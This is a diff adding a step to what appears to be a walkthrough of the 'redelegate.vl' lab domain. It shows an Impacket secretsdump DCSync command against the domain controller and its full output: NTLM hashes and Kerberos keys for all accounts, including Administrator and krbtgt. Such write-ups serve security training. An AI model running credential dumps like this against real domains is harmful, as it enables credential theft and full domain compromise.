@@ -586,5 +586,65 @@ export KRB5CCNAME=DC\$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
 ```
 
 ```python
+secretsdump.py -k -no-pass -dc-ip "10.129.234.50" @dc.redelegate.vl 
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
+Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
+Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
+Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
+Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
+James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
+Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
+sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
+FS01$:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
+Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
+Administrator:des-cbc-md5:102f86737c3e9b2f
+krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
+krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
+krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
+Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
+Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
+Christine.Flanders:des-cbc-md5:8980267623df2637
+Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
+Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
+Marie.Curie:des-cbc-md5:256889c8bf678910
+Helen.Frost:aes256-cts-hmac-sha1-96:6df13a248e2ce1460004d7dcce5c4f8a30ea2c53e2c7d3ef712410f102cacf61
+Helen.Frost:aes128-cts-hmac-sha1-96:884020e4824c0f50e596ba7a5d635634
+Helen.Frost:des-cbc-md5:1a26f249a80d70df
+Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
+Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
+Michael.Pontiac:des-cbc-md5:833dc82fab76c229
+Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
+Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
+Mallory.Roberts:des-cbc-md5:cb25a726ae198686
+James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
+James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
+James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
+Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
+Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
+Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
+sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
+sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
+sql_svc:des-cbc-md5:970d6115d3f4a43b
+DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
+DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
+DC$:des-cbc-md5:3db913751c434f61
+FS01$:aes256-cts-hmac-sha1-96:c8142b9998787102dc1d596190bc28b16a1787f24e956d0a204077efc31117ba
+FS01$:aes128-cts-hmac-sha1-96:48bcef06410264d5d28d91d7d8eb7cd1
+FS01$:des-cbc-md5:1f8058fde68a58df
+[*] Cleaning up...
+```
+Ive dumped all the hashes using DCSync privs
+
+```
 ```
